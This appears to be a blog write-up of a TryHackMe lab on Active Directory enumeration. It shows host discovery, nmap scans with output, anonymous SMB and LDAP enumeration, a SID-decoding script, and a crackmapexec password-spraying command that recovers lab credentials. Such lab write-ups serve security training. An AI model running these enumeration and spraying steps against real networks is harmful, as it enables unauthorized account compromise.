---
layout: post
title: 'Tryhackme: AD: Basic Enumeration'
date:  2025-07-10 23:00:00 +0530 
categories: [Tryhackme]
tags: [hacking, tryhackme, namp, smbclient, ldapsearch,ftp,ssh] # TAG names should always be lowercase 
render_with_liquid: false
media_subpath: /images/AD_Basic_Enumeration/

---


# Tryhackme: AD: Basic Enumeration | Writeup | 10 July 2025

![TryHackMe Logo](THM.png)
![Overpass_image](AD_BE.png)

---

**Author:** *Aakash Modi*


---

# Mapping Out the Network - Task 1

## 🔍 Host Discovery

**Command:**
```bash
fping -agq 10.211.11.0/24
```
```console
10.211.11.10
10.211.11.20
10.211.11.250
```
![Host Discovery Command](host_cmd.png)
![Host Names](hosts_name.png)

---

## 🔍 Nmap Scan / Port Scanning

**Commands:**
```bash
nmap -p 88,135,139,389,445 -sV -sC -iL hosts.txt
sudo nmap -sS -p- -T3 -iL hosts.txt -oN full_port_scan.txt
```

```console
nmap -p 88,135,139,389,445 -sV -sC -iL hosts.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-09 10:28 IST
Stats: 0:00:02 elapsed; 0 hosts completed (3 up), 3 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 93.33% done; ETC: 10:28 (0:00:00 remaining)
Stats: 0:00:09 elapsed; 0 hosts completed (3 up), 3 undergoing Service Scan
Service scan Timing: About 0.00% done
Stats: 0:01:00 elapsed; 0 hosts completed (3 up), 3 undergoing Script Scan
NSE Timing: About 96.88% done; ETC: 10:29 (0:00:00 remaining)
Nmap scan report for 10.211.11.10
Host is up (0.18s latency).

PORT    STATE SERVICE      VERSION
88/tcp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-07-09 04:58:23Z)
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: tryhackme.loc0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds Windows Server 2019 Datacenter 17763 microsoft-ds (workgroup: TRYHACKME)
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2019 Datacenter 17763 (Windows Server 2019 Datacenter 6.3)
|   Computer name: DC
|   NetBIOS computer name: DC�
|   Domain name: tryhackme.loc
|   Forest name: tryhackme.loc
|   FQDN: DC.tryhackme.loc
|_  System time: 2025-07-09T04:58:34+00:00
| smb2-time: 
|   date: 2025-07-09T04:58:37
|_  start_date: N/A

Nmap scan report for 10.211.11.20
Host is up (0.18s latency).

PORT    STATE    SERVICE       VERSION
88/tcp  filtered kerberos-sec
135/tcp open     msrpc         Microsoft Windows RPC
139/tcp open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp filtered ldap
445/tcp open     microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-07-09T04:58:40
|_  start_date: N/A

Nmap scan report for 10.211.11.250
Host is up (0.18s latency).

PORT    STATE  SERVICE      VERSION
88/tcp  closed kerberos-sec
135/tcp closed msrpc
139/tcp closed netbios-ssn
389/tcp closed ldap
445/tcp closed microsoft-ds

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 3 IP addresses (3 hosts up) scanned in 65.72 seconds

```
![Nmap Scan Screenshot](nmap_scan.png)

---

### Questions

1. **What is the domain name of our target?**  
   `tryhackme.loc`

2. **What version of Windows Server is running on the DC?**  
   `Windows Server 2019 Datacenter`

![Scan First IP](scan_first_IP.png)

---

# Network Enumeration With SMB - Task 2

**List SMB Shares:**
```bash
smbclient -L //10.211.11.10 -N
```
![SMB Shares](smbclient.png)

**Access SharedFiles:**
```bash
smbclient //10.211.11.10/SharedFiles -N
get Mouse_and_Malware.txt
```
![SMB Client CLI](smbclient_cli.png)

**Access UserBackups:**
```bash
smbclient //10.211.11.10/UserBackups -N
get flag.txt
```
![Flag Download](flag_dow.png)
![SMB Client Flag](smbclinet_flag.png)

**Question:**  
*What is the flag hidden in one of the shares?*  
**Flag:** `THM{88_SMB_88}`  
![Flag](flag.png)

---

# Domain Enumeration - Task 3

## LDAP Enumeration

**Basic LDAP Query:**
```bash
ldapsearch -x -H ldap://10.211.11.10 -s base
```
![LDAP Output](lda_output.png)

**Enumerate Users:**
```bash
ldapsearch -x -H ldap://10.211.11.10 -b "dc=tryhackme,dc=loc" "(objectClass=person)"
```
![LDAP Usernames](lda_username_found.png)

**Check User Groups:**
```bash
ldapsearch -x -H ldap://10.211.11.10 -b "dc=tryhackme,dc=loc" "(distinguishedName=CN=Raoul Duke,CN=Users,DC=tryhackme,DC=loc)" memberOf
```
![LDAP Group Find](lda_group_find.png)

- **What group is the user rduke part of?**  
  *Not found, so likely only "Domain Users".*

- **What is this user's full name?**  
`Raoul Duke`
  
  ![rduke info](rduke_info.png)

**Find objectSid for all users:**
```bash
ldapsearch -x -H ldap://10.211.11.10 -b "dc=tryhackme,dc=loc" "(objectClass=user)" objectSid
```
![Object SID](object_sid.png)

**Python Script to Match RID to objectSid:**
```python
import base64
import struct

sid_base64_list = [
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEA9QEAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEA8AMAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAVwQAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEASQYAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAUAYAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAUQYAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAUgYAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAUwYAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAVAYAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAVQYAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAVgYAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAVwYAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAWAYAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAWQYAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAWgYAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAWwYAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAXAYAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAXQYAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAXgYAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAXwYAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAYAYAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAYQYAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAYgYAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAYwYAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAZwYAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAaAYAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAaQYAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAMQoAAA==",
    "AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAARIAAA=="
]

for sid_b64 in sid_base64_list:
    sid_bytes = base64.b64decode(sid_b64)
    rid = struct.unpack("<I", sid_bytes[-4:])[0]
    if rid == 1634:
        print(f"SID with RID 1634 found: {sid_b64}")
```
**Result:**  
`SID with RID 1634 found: AQUAAAAAAAUVAAAAKeA2dTgJ371Q0KEAYgYAAA==`

![Match SID](match_sid.png)

- **Which username is associated with RID 1634?**  
  `katie.thomas`

---

# Password Spraying - Task 4

**Check Password Policy:**
```bash
rpcclient -U "" 10.211.11.10 -N
getdompwinfo
```
![Password Policy](password_policy.png)

**Or with CrackMapExec:**
```bash
crackmapexec smb 10.211.11.10 --pass-pol
```
![Password Policy CrackMapExec](password_policy_crackm.png)

- **What is the minimum password length?**  
  `7`
- **What is the locked account duration?**  
  `2 minutes`

**Password Spraying with CrackMapExec:**
```bash
crackmapexec smb 10.211.11.10 -u users.txt -p passwords.txt
```
- **Valid credentials found:**  
  `rduke:Password1!`
![Password Flag](password_flag.png)

---

# 🛠️ Tools Used

- Nmap
- smbclient
- ldapsearch
- rpcclient
- crackmapexec

---

# 🎯 Conclusion

- All tasks completed successfully!
<div align="center">
  <img src="completed.png" alt="Room Completed" width="600"/>
</div>

---

## 🎉 Happy Hacking!

<div align="center">
    <a href="https://giphy.com/gifs/charlie-hunnam-gif-hunt-102h4wsmCG2s12">
        <img src="https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExcjc2ZjJub3Vpa2xhMHhiYnRqcnd4NDVmdm85YzJ0aWhmbTUzOWpqdiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/78XCFBGOlS6keY1Bil/giphy.gif" alt="Charlie Hunnam GIF" width="400"/>
    </a>
</div>

---
